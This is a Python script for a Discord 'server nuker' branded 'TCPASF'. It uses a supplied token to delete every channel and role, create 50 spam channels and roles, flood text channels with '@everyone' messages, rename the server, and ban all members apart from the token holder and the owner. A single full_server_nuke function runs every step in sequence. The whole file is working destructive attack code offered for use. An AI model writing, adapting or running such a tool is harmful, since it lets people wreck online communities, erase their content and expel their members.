import requests
import json
import time
import sys
import os
import threading
import random
from colorama import init, Fore, Style

init(autoreset=True)

DISCORD_API = "https://discord.com/api/v9"

def get_server_info(token, server_id):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(f"{DISCORD_API}/guilds/{server_id}", headers=headers)

        if response.status_code == 200:
            server_data = response.json()
            print(f"\n{Fore.GREEN}[+] Server Information:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Name: {Style.RESET_ALL}{server_data.get('name')}")
            print(f"{Fore.CYAN}ID: {Style.RESET_ALL}{server_data.get('id')}")
            print(f"{Fore.CYAN}Owner ID: {Style.RESET_ALL}{server_data.get('owner_id')}")
            print(f"{Fore.CYAN}Region: {Style.RESET_ALL}{server_data.get('region', 'N/A')}")
            print(f"{Fore.CYAN}Member Count: {Style.RESET_ALL}{server_data.get('approximate_member_count', 'N/A')}")

            return True, server_data
        else:
            print(f"{Fore.RED}[-] Failed to get server information. Status code: {response.status_code}{Style.RESET_ALL}")
            if response.status_code == 403:
                print(f"{Fore.RED}[-] Access forbidden. Make sure you have the correct permissions.{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error getting server information: {str(e)}{Style.RESET_ALL}")
        return False, None

def get_server_channels(token, server_id):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(f"{DISCORD_API}/guilds/{server_id}/channels", headers=headers)

        if response.status_code == 200:
            channels = response.json()
            return True, channels
        else:
            print(f"{Fore.RED}[-] Failed to get server channels. Status code: {response.status_code}{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error getting server channels: {str(e)}{Style.RESET_ALL}")
        return False, None

def get_server_roles(token, server_id):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(f"{DISCORD_API}/guilds/{server_id}/roles", headers=headers)

        if response.status_code == 200:
            roles = response.json()
            return True, roles
        else:
            print(f"{Fore.RED}[-] Failed to get server roles. Status code: {response.status_code}{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error getting server roles: {str(e)}{Style.RESET_ALL}")
        return False, None

def delete_channel(token, channel_id):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.delete(f"{DISCORD_API}/channels/{channel_id}", headers=headers)

        if response.status_code == 200:
            return True
        else:
            return False

    except:
        return False

def delete_all_channels(token, server_id):
    success, channels = get_server_channels(token, server_id)

    if not success or not channels:
        print(f"{Fore.RED}[-] Failed to get channels to delete.{Style.RESET_ALL}")
        return False

    total_channels = len(channels)
    deleted_count = 0

    print(f"\n{Fore.YELLOW}[*] Deleting {total_channels} channels...{Style.RESET_ALL}")

    for channel in channels:
        channel_id = channel.get('id')
        channel_name = channel.get('name')

        if delete_channel(token, channel_id):
            deleted_count += 1
            print(f"{Fore.GREEN}[+] Deleted channel: {channel_name} ({channel_id}){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to delete channel: {channel_name} ({channel_id}){Style.RESET_ALL}")

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {deleted_count}/{total_channels} channels deleted ({int(deleted_count/total_channels*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

        # Avoid rate limiting
        time.sleep(0.5)

    print(f"\n\n{Fore.GREEN}[+] Deleted {deleted_count}/{total_channels} channels.{Style.RESET_ALL}")
    return deleted_count > 0

def delete_role(token, server_id, role_id):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.delete(f"{DISCORD_API}/guilds/{server_id}/roles/{role_id}", headers=headers)

        if response.status_code == 204:
            return True
        else:
            return False

    except:
        return False

def delete_all_roles(token, server_id):
    success, roles = get_server_roles(token, server_id)

    if not success or not roles:
        print(f"{Fore.RED}[-] Failed to get roles to delete.{Style.RESET_ALL}")
        return False

    # Filter out the @everyone role which cannot be deleted
    roles = [role for role in roles if role.get('name') != '@everyone']

    total_roles = len(roles)
    deleted_count = 0

    print(f"\n{Fore.YELLOW}[*] Deleting {total_roles} roles...{Style.RESET_ALL}")

    for role in roles:
        role_id = role.get('id')
        role_name = role.get('name')

        if delete_role(token, server_id, role_id):
            deleted_count += 1
            print(f"{Fore.GREEN}[+] Deleted role: {role_name} ({role_id}){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to delete role: {role_name} ({role_id}){Style.RESET_ALL}")

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {deleted_count}/{total_roles} roles deleted ({int(deleted_count/total_roles*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

        # Avoid rate limiting
        time.sleep(0.5)

    print(f"\n\n{Fore.GREEN}[+] Deleted {deleted_count}/{total_roles} roles.{Style.RESET_ALL}")
    return deleted_count > 0

def create_channel(token, server_id, name, channel_type=0):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    data = {
        "name": name,
        "type": channel_type
    }

    try:
        response = requests.post(f"{DISCORD_API}/guilds/{server_id}/channels", headers=headers, json=data)

        if response.status_code == 201:
            return True, response.json()
        else:
            return False, None

    except:
        return False, None

def create_spam_channels(token, server_id, count=50, prefix="nuked-by-tcpasf-"):
    created_count = 0

    print(f"\n{Fore.YELLOW}[*] Creating {count} spam channels...{Style.RESET_ALL}")

    for i in range(count):
        channel_name = f"{prefix}{i+1}"

        success, channel = create_channel(token, server_id, channel_name)

        if success:
            created_count += 1
            print(f"{Fore.GREEN}[+] Created channel: {channel_name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to create channel: {channel_name}{Style.RESET_ALL}")

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {created_count}/{count} channels created ({int(created_count/count*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

        # Avoid rate limiting
        time.sleep(0.5)

    print(f"\n\n{Fore.GREEN}[+] Created {created_count}/{count} spam channels.{Style.RESET_ALL}")
    return created_count > 0

def create_role(token, server_id, name, color=0):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    data = {
        "name": name,
        "color": color
    }

    try:
        response = requests.post(f"{DISCORD_API}/guilds/{server_id}/roles", headers=headers, json=data)

        if response.status_code == 200:
            return True, response.json()
        else:
            return False, None

    except:
        return False, None

def create_spam_roles(token, server_id, count=50, prefix="NUKED-"):
    created_count = 0

    print(f"\n{Fore.YELLOW}[*] Creating {count} spam roles...{Style.RESET_ALL}")

    for i in range(count):
        role_name = f"{prefix}{i+1}"
        color = random.randint(0, 0xFFFFFF)

        success, role = create_role(token, server_id, role_name, color)

        if success:
            created_count += 1
            print(f"{Fore.GREEN}[+] Created role: {role_name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to create role: {role_name}{Style.RESET_ALL}")

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {created_count}/{count} roles created ({int(created_count/count*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

        # Avoid rate limiting
        time.sleep(0.5)

    print(f"\n\n{Fore.GREEN}[+] Created {created_count}/{count} spam roles.{Style.RESET_ALL}")
    return created_count > 0

def send_message(token, channel_id, message):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    data = {
        "content": message
    }

    try:
        response = requests.post(f"{DISCORD_API}/channels/{channel_id}/messages", headers=headers, json=data)

        if response.status_code == 200:
            return True
        else:
            return False

    except:
        return False

def spam_all_channels(token, server_id, message="@everyone This server has been nuked by TCPASF", count=10):
    success, channels = get_server_channels(token, server_id)

    if not success or not channels:
        print(f"{Fore.RED}[-] Failed to get channels to spam.{Style.RESET_ALL}")
        return False

    # Filter text channels only (type 0)
    text_channels = [channel for channel in channels if channel.get('type') == 0]

    if not text_channels:
        print(f"{Fore.RED}[-] No text channels found to spam.{Style.RESET_ALL}")
        return False

    total_channels = len(text_channels)
    spammed_count = 0

    print(f"\n{Fore.YELLOW}[*] Spamming {total_channels} channels with {count} messages each...{Style.RESET_ALL}")

    for channel in text_channels:
        channel_id = channel.get('id')
        channel_name = channel.get('name')

        print(f"\n{Fore.YELLOW}[*] Spamming channel: {channel_name} ({channel_id}){Style.RESET_ALL}")

        success_count = 0

        for i in range(count):
            if send_message(token, channel_id, f"{message} [{i+1}/{count}]"):
                success_count += 1
                print(f"{Fore.GREEN}[+] Sent message {i+1}/{count}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Failed to send message {i+1}/{count}{Style.RESET_ALL}")

            # Avoid rate limiting
            time.sleep(0.5)

        if success_count > 0:
            spammed_count += 1

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {spammed_count}/{total_channels} channels spammed ({int(spammed_count/total_channels*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

    print(f"\n\n{Fore.GREEN}[+] Spammed {spammed_count}/{total_channels} channels.{Style.RESET_ALL}")
    return spammed_count > 0

def change_server_settings(token, server_id, name="NUKED BY TCPASF", icon=None):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    data = {
        "name": name
    }

    if icon:
        data["icon"] = icon

    try:
        response = requests.patch(f"{DISCORD_API}/guilds/{server_id}", headers=headers, json=data)

        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Changed server name to: {name}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[-] Failed to change server settings. Status code: {response.status_code}{Style.RESET_ALL}")
            return False

    except Exception as e:
        print(f"{Fore.RED}[-] Error changing server settings: {str(e)}{Style.RESET_ALL}")
        return False

def ban_member(token, server_id, user_id, reason="Banned by TCPASF Nuker"):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    data = {
        "delete_message_days": "7",
        "reason": reason
    }

    try:
        response = requests.put(f"{DISCORD_API}/guilds/{server_id}/bans/{user_id}", headers=headers, json=data)

        if response.status_code == 204:
            return True
        else:
            return False

    except:
        return False

def get_server_members(token, server_id, limit=1000):
    # Format token properly if it's not already formatted
    if not token.startswith(('Bot ', 'Bearer ')):
        # For user tokens
        formatted_token = token
    else:
        formatted_token = token

    headers = {
        "Authorization": formatted_token,
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(f"{DISCORD_API}/guilds/{server_id}/members?limit={limit}", headers=headers)

        if response.status_code == 200:
            members = response.json()
            return True, members
        else:
            print(f"{Fore.RED}[-] Failed to get server members. Status code: {response.status_code}{Style.RESET_ALL}")
            return False, None

    except Exception as e:
        print(f"{Fore.RED}[-] Error getting server members: {str(e)}{Style.RESET_ALL}")
        return False, None

def ban_all_members(token, server_id):
    success, members = get_server_members(token, server_id)

    if not success or not members:
        print(f"{Fore.RED}[-] Failed to get members to ban.{Style.RESET_ALL}")
        return False

    # Get bot's user ID to avoid banning self
    try:
        me_response = requests.get(f"{DISCORD_API}/users/@me", headers={"Authorization": token})
        if me_response.status_code == 200:
            my_id = me_response.json().get('id')
        else:
            my_id = None
    except:
        my_id = None

    # Filter out the bot and server owner
    success, server_data = get_server_info(token, server_id)
    owner_id = server_data.get('owner_id') if success else None

    members_to_ban = []
    for member in members:
        user_id = member.get('user', {}).get('id')
        if user_id != my_id and user_id != owner_id:
            members_to_ban.append(member)

    total_members = len(members_to_ban)
    banned_count = 0

    print(f"\n{Fore.YELLOW}[*] Banning {total_members} members...{Style.RESET_ALL}")

    for member in members_to_ban:
        user = member.get('user', {})
        user_id = user.get('id')
        username = user.get('username')

        if ban_member(token, server_id, user_id):
            banned_count += 1
            print(f"{Fore.GREEN}[+] Banned user: {username} ({user_id}){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Failed to ban user: {username} ({user_id}){Style.RESET_ALL}")

        # Progress update
        sys.stdout.write(f"\r{Fore.CYAN}[*] Progress: {banned_count}/{total_members} members banned ({int(banned_count/total_members*100)}%){Style.RESET_ALL}")
        sys.stdout.flush()

        # Avoid rate limiting
        time.sleep(0.5)

    print(f"\n\n{Fore.GREEN}[+] Banned {banned_count}/{total_members} members.{Style.RESET_ALL}")
    return banned_count > 0

def full_server_nuke(token, server_id):
    print(f"\n{Fore.RED}[!] Starting full server nuke...{Style.RESET_ALL}")

    # Change server name
    change_server_settings(token, server_id)

    # Delete all channels
    delete_all_channels(token, server_id)

    # Delete all roles
    delete_all_roles(token, server_id)

    # Create spam channels
    create_spam_channels(token, server_id)

    # Create spam roles
    create_spam_roles(token, server_id)

    # Get new channels for spamming
    success, channels = get_server_channels(token, server_id)
    if success and channels:
        # Spam all channels
        spam_all_channels(token, server_id)

    # Ban all members
    ban_all_members(token, server_id)

    print(f"\n{Fore.GREEN}[+] Full server nuke completed!{Style.RESET_ALL}")
